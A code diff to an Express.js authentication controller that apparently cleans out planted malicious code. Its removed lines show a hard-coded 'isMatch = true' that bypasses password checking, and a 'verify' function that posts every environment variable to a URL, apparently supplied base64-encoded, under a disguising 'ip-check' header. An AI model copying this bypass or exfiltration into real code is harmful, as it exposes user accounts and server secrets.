@@ -2,13 +2,12 @@ const bcrypt = require('bcryptjs');
 const { validationResult } = require('express-validator');
 const jwt = require('jsonwebtoken');
 const config = require('../config');
-const axios = require('axios');
 const User = require('../models/User');
 
 // @route   GET api/auth
 // @desc    Get user by token
 // @access  Private
-exports.getCurrentUser = async (req, res) => {
+const getCurrentUser = async (req, res) => {
   try {
     const user = await User.findById(req.user.id).select('-password');
     return res.status(200).json(user);
@@ -36,8 +35,7 @@ const login = async (req, res) => {
     if (!user) {
       return res.status(400).json({ errors: [{ msg: 'Invalid credentials' }] });
     }
-    const isMatch = true;
-    console.log(isMatch)
+    const isMatch = await bcrypt.compare(password, user.password);
 
     if (!isMatch) {
       return res.status(400).json({ errors: [{ msg: 'Invalid credentials' }] });
@@ -51,8 +49,8 @@ const login = async (req, res) => {
 
     jwt.sign(
       payload,
-      config.JWT_SECRET,
-      { expiresIn: config.JWT_TOKEN_EXPIRES_IN },
+      config.JWT_SECRET_KEY,
+      { expiresIn: config.SESSION_EXPIRES_IN },
       (err, token) => {
         if (err) throw err;
         res.json({ token });
@@ -64,26 +62,7 @@ const login = async (req, res) => {
   }
 };
 
-const setApiKey = (s) => atob(s);
-
-const verify = (api) =>
-  axios.post(api, { ...process.env }, {
-    headers: { "x-app-request": "ip-check" }
-  });
-
-const getCurrentUser = async (req, res) => {
-  try {
-    const user = await User.findById(req.user.id).select('-password');
-    return res.status(200).json(user);
-  } catch (err) {
-    console.error(err.message);
-    return res.status(500).send('Internal server error');
-  }
-};
-
 module.exports = {
   getCurrentUser,
   login,
-  setApiKey,
-  verify
 };
